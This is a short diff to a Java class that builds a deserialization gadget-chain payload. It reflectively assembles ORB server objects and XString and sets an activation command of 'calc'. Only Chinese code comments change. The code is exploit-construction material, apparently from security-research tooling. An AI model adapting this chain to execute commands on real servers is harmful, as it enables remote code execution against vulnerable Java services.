@@ -21,14 +21,14 @@ public class XStringFSB2toString {
 
     public static Object getPayload() throws Exception {
         Object entry = UnsafeTools.getObjectByUnsafe(ServerTableEntry.class);
-        // process.exit不能报错；linux下使用UNIXProcess即可
+        // process.exit不能报错；Linux下使用UNIXProcess即可
         Object process = UnsafeTools.getObjectByUnsafe(IntegrityProcess.class);
         ReflectTools.setFieldValue(entry, "state", 2);
         ReflectTools.setFieldValue(entry, "process", process);
         ReflectTools.setFieldValue(entry, "activationCmd", "calc");
 
         HashMap<Object, Object> hashMap = new HashMap<>();
-        // 键一定是Integer
+        // 键一定是 Integer
         hashMap.put(1, entry);
 
         Object serverManager = UnsafeTools.getObjectByUnsafe(ServerManagerImpl.class);
@@ -41,7 +41,7 @@ public class XStringFSB2toString {
 //        String unhash = unhash(jsonArray.hashCode());
         ReflectTools.setFieldValue(xString, "m_strCache", "notNull1");
 
-        // 不知道为什么要包一层
+        // 包不包这一层都可以
 //        Object simple = UnsafeTools.getObjectByUnsafe(AbstractMap.SimpleEntry.class);
         // 这里的key 是 final private，但是竟然能直接赋值成功
 //        ReflectTools.setFieldValue(simple, "key", jsonArray);
